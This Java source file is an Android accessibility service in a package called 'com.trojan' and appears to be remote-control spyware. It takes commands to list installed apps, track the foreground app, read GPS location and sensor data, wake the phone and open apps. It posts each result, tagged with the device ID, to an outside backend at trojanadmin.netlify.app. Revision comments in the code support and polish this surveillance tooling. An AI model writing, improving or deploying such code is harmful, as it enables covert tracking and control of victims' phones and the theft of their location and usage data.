package com.trojan;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.location.Location;
import android.os.BatteryManager;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class PowerAccessibilityService extends AccessibilityService implements SensorEventListener {

    // Use a consistent log tag
    private static final String TAG = "PowerAccessibility";

    // Action strings for commands (no changes needed)
    public static final String ACTION_TRIGGER_LOCK_SCREEN = "com.trojan.ACTION_LOCK_SCREEN";
    public static final String ACTION_TRIGGER_SHUTDOWN = "com.trojan.ACTION_SHUTDOWN";
    public static final String ACTION_TRIGGER_LIST_APPS = "com.trojan.ACTION_LIST_APPS";
    public static final String ACTION_TRIGGER_GET_CURRENT_APP = "com.trojan.ACTION_GET_CURRENT_APP";
    public static final String ACTION_TRIGGER_OPEN_APP = "com.trojan.ACTION_OPEN_APP";
    public static final String ACTION_TRIGGER_NAV_BACK = "com.trojan.ACTION_NAV_BACK";
    public static final String ACTION_TRIGGER_NAV_HOME = "com.trojan.ACTION_NAV_HOME";
    public static final String ACTION_TRIGGER_NAV_RECENTS = "com.trojan.ACTION_NAV_RECENTS";
    public static final String ACTION_TRIGGER_WAKE_DEVICE = "com.trojan.ACTION_WAKE_DEVICE";
    public static final String ACTION_TRIGGER_TOGGLE_WIFI = "com.trojan.ACTION_TOGGLE_WIFI";
    public static final String ACTION_TRIGGER_TOGGLE_BLUETOOTH = "com.trojan.ACTION_TOGGLE_BLUETOOTH";
    public static final String ACTION_TRIGGER_TOGGLE_LOCATION = "com.trojan.ACTION_TOGGLE_LOCATION";
    public static final String ACTION_TRIGGER_GET_LOCATION = "com.trojan.ACTION_GET_LOCATION";
    public static final String ACTION_TRIGGER_GET_SENSORS = "com.trojan.ACTION_GET_SENSORS";
    public static final String ACTION_TRIGGER_GET_SCREEN_STATUS = "com.trojan.ACTION_GET_SCREEN_STATUS";
    public static final String ACTION_TRIGGER_GET_BATTERY_STATUS = "com.trojan.ACTION_GET_BATTERY_STATUS";

    // URL to the backend function that receives data from the device
    private static final String SUBMIT_DATA_URL = "https://trojanadmin.netlify.app/.netlify/functions/submit-data";

    private PowerActionReceiver powerActionReceiver;
    private RequestQueue requestQueue;
    private String lastForegroundAppPkg = "N/A";

    private FusedLocationProviderClient fusedLocationClient;
    private SensorManager sensorManager;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.i(TAG, "Accessibility Service Connected and ready.");
        
        requestQueue = Volley.newRequestQueue(this);
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);

        powerActionReceiver = new PowerActionReceiver();
        IntentFilter filter = new IntentFilter();
        // Add all actions to the filter
        filter.addAction(ACTION_TRIGGER_LOCK_SCREEN); filter.addAction(ACTION_TRIGGER_SHUTDOWN);
        filter.addAction(ACTION_TRIGGER_LIST_APPS); filter.addAction(ACTION_TRIGGER_GET_CURRENT_APP);
        filter.addAction(ACTION_TRIGGER_OPEN_APP); filter.addAction(ACTION_TRIGGER_NAV_BACK);
        filter.addAction(ACTION_TRIGGER_NAV_HOME); filter.addAction(ACTION_TRIGGER_NAV_RECENTS);
        filter.addAction(ACTION_TRIGGER_WAKE_DEVICE); filter.addAction(ACTION_TRIGGER_TOGGLE_WIFI);
        filter.addAction(ACTION_TRIGGER_TOGGLE_BLUETOOTH); filter.addAction(ACTION_TRIGGER_TOGGLE_LOCATION);
        filter.addAction(ACTION_TRIGGER_GET_LOCATION); filter.addAction(ACTION_TRIGGER_GET_SENSORS);
        filter.addAction(ACTION_TRIGGER_GET_SCREEN_STATUS); filter.addAction(ACTION_TRIGGER_GET_BATTERY_STATUS);
        
        // Using RECEIVER_NOT_EXPORTED is correct and secure
        registerReceiver(powerActionReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        Log.d(TAG, "PowerActionReceiver registered for all actions.");
    }

    private class PowerActionReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = (intent == null) ? null : intent.getAction();
            if (action == null) return;
            Log.i(TAG, "Command received: " + action);

            switch (action) {
                case ACTION_TRIGGER_LOCK_SCREEN: performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN); break;
                case ACTION_TRIGGER_SHUTDOWN: performGlobalAction(GLOBAL_ACTION_POWER_DIALOG); break;
                case ACTION_TRIGGER_NAV_BACK: performGlobalAction(GLOBAL_ACTION_BACK); break;
                case ACTION_TRIGGER_NAV_HOME: performGlobalAction(GLOBAL_ACTION_HOME); break;
                case ACTION_TRIGGER_NAV_RECENTS: performGlobalAction(GLOBAL_ACTION_RECENTS); break;
                case ACTION_TRIGGER_LIST_APPS: getAndUploadAppList(); break;
                case ACTION_TRIGGER_GET_CURRENT_APP: submitDataToServer("current_app", lastForegroundAppPkg); break;
                case ACTION_TRIGGER_OPEN_APP:
                    String pkg = intent.getStringExtra("package_name");
                    if (pkg != null) openApp(pkg);
                    break;
                case ACTION_TRIGGER_WAKE_DEVICE: wakeUpDevice(); break;
                case ACTION_TRIGGER_GET_SCREEN_STATUS: getScreenStatus(); break;
                case ACTION_TRIGGER_GET_BATTERY_STATUS: getBatteryStatus(); break;
                case ACTION_TRIGGER_TOGGLE_WIFI: openSettingsPanel(Settings.Panel.ACTION_WIFI); break;
                case ACTION_TRIGGER_TOGGLE_BLUETOOTH: openSettingsPanel(Settings.ACTION_BLUETOOTH_SETTINGS); break;
                case ACTION_TRIGGER_TOGGLE_LOCATION: openSettingsPanel(Settings.ACTION_LOCATION_SOURCE_SETTINGS); break;
                case ACTION_TRIGGER_GET_LOCATION: getCurrentLocation(); break;
                case ACTION_TRIGGER_GET_SENSORS: getSensorData(); break;
            }
        }
    }
    
    // --- UPDATED to fix data format ---
    private void getAndUploadAppList() {
        try {
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            // The frontend parser expects a JSONObject (map), not a JSONArray.
            JSONObject appMap = new JSONObject();
            for (ApplicationInfo app : apps) {
                // Filter out system apps
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    appMap.put(app.packageName, app.loadLabel(pm).toString());
                }
            }
            submitDataToServer("installed_apps", appMap);
        } catch (Exception e) {
            Log.e(TAG, "Failed to get app list.", e);
            submitDataToServer("app_list_error", "Failed to get app list.");
        }
    }
    
    // --- UPDATED with more robust error handling and comments ---
    private void getCurrentLocation() {
        // --- CRITICAL NOTE ---
        // This function will FAIL if the user has not MANUALLY granted the
        // "Location" permission to this app in their phone's settings.
        // You must also add <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
        // to your AndroidManifest.xml file.
        try {
            fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
                try {
                    if (location != null) {
                        JSONObject locJson = new JSONObject();
                        locJson.put("latitude", location.getLatitude());
                        locJson.put("longitude", location.getLongitude());
                        submitDataToServer("location", locJson);
                    } else {
                        // This can happen if location is turned off or has never been polled.
                        Log.w(TAG, "FusedLocationProvider returned null. Location might be off.");
                        submitDataToServer("location", "Not available");
                    }
                } catch (JSONException e) {
                    Log.e(TAG, "Error creating location JSON.", e);
                    submitDataToServer("location_error", "JSON creation failed.");
                }
            });
        } catch (SecurityException e) {
            Log.e(TAG, "Location permission not granted by user.", e);
            submitDataToServer("location", "Permission Denied");
        }
    }

    // --- All other methods remain largely the same, as they were well-structured ---
    
    private void getSensorData() {
        Sensor accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
        if (accelerometer != null) {
             sensorManager.registerListener(this, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
        } else {
            submitDataToServer("accelerometer", "Not available");
        }
    }
    
    @Override
    public final void onSensorChanged(SensorEvent event) {
        JSONObject sensorData = new JSONObject();
        String sensorType = "";
        try {
            sensorData.put("x", event.values[0]);
            sensorData.put("y", event.values[1]);
            sensorData.put("z", event.values[2]);
            if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) {
                sensorType = "accelerometer";
            }
            
            if (!sensorType.isEmpty()) {
                submitDataToServer(sensorType, sensorData);
            }
        } catch (JSONException e) { 
            Log.e(TAG, "JSON error creating sensor data", e); 
        } finally {
            // Unregister after one reading to save battery
            sensorManager.unregisterListener(this, event.sensor);
        }
    }

    private void submitDataToServer(String dataType, Object payload) {
        // This function is the single point of contact with your backend.
        // If data doesn't appear, check the logs in your "submit-data" Netlify function.
        JSONObject postData = new JSONObject();
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("payload", payload);
        } catch (JSONException e) {
            Log.e(TAG, "Could not create submission JSON", e);
            return;
        }
        
        Log.d(TAG, "Submitting data to server. Type: " + dataType + ", Payload: " + payload.toString());
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData,
            response -> Log.i(TAG, "Data submitted successfully: " + dataType),
            error -> Log.e(TAG, "Failed to submit data '" + dataType + "': " + error.toString())
        );
        requestQueue.add(request);
    }
    
    // --- Other utility methods (unchanged) ---
    private void getBatteryStatus() {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, filter);
        try {
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                float batteryPct = (level == -1 || scale == -1) ? -1f : level * 100 / (float) scale;
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                boolean isCharging = (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL);
                JSONObject batteryJson = new JSONObject();
                batteryJson.put("percentage", batteryPct);
                batteryJson.put("isCharging", isCharging);
                submitDataToServer("battery_status", batteryJson);
            }
        } catch (JSONException e) { Log.e(TAG, "Error creating battery JSON."); }
    }
    
    private void getScreenStatus() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        submitDataToServer("screen_status", pm.isInteractive() ? "On" : "Off");
    }

    private void openSettingsPanel(String settingsAction) {
        Intent intent = new Intent(settingsAction);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    
    @SuppressLint("WakelockTimeout")
    private void wakeUpDevice() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "trojan::WakeLock");
        wakeLock.acquire();
        wakeLock.release();
    }

    private void openApp(String packageName) {
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
        if (launchIntent != null) {
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(launchIntent);
        }
    }
    
    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {}
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.getPackageName() != null) {
            lastForegroundAppPkg = event.getPackageName().toString();
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Accessibility Service interrupted.");
    }

    @Override
    public boolean onUnbind(Intent intent) {
        if (powerActionReceiver != null) unregisterReceiver(powerActionReceiver);
        sensorManager.unregisterListener(this);
        Log.i(TAG, "Accessibility Service Unbound.");
        return super.onUnbind(intent);
    }
}
